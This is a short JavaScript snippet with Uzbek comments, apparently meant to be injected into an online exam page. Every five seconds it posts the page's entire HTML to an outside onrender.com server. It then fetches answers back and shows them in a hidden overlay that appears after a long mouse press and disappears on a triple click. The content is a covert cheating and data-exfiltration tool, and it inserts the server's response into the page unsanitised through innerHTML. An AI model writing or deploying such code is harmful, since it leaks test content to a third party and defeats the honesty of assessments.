(function(){
    const S = 'https://f1-f2mq.onrender.com';
    let box = null;

    // 1. Savollarni serverga yuborish (Har 5 soniyada)
    async function yubor() {
        try {
            await fetch(S + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: document.documentElement.outerHTML })
            });
        } catch (e) {}
    }
    setInterval(yubor, 5000);
    yubor();

    // 2. Javob qutichasini yaratish (Dastlab yashirin bo'ladi)
    function createBox() {
        if (!box) {
            box = document.createElement('div');
            box.style = "position:fixed; top:10px; right:10px; background:rgba(0,0,0,0.9); color:white; padding:15px; border-radius:8px; z-index:999999; font-family:sans-serif; display:none; max-width:250px; font-size:14px; border:1px solid #444; box-shadow:0 4px 10px rgba(0,0,0,0.5);";
            document.body.appendChild(box);
        }
    }

    // 3. Javobni ko'rsatish (3 soniya bosib turganda)
    let t;
    document.addEventListener('mousedown', () => {
        t = setTimeout(async () => {
            const r = await fetch(S + '/latest');
            const d = await r.json();
            createBox();
            box.innerHTML = "<b>Javoblar:</b><br>" + d.message;
            box.style.display = 'block';
        }, 3000);
    });
    document.addEventListener('mouseup', () => clearTimeout(t));

    // 4. Javobni yo'qotish (3 marta tez-tez bosganda - Triple Click)
    document.addEventListener('click', (e) => {
        if (e.detail === 3) { // 3 marta tez bosilganda
            if (box) box.style.display = 'none';
        }
    });
})();
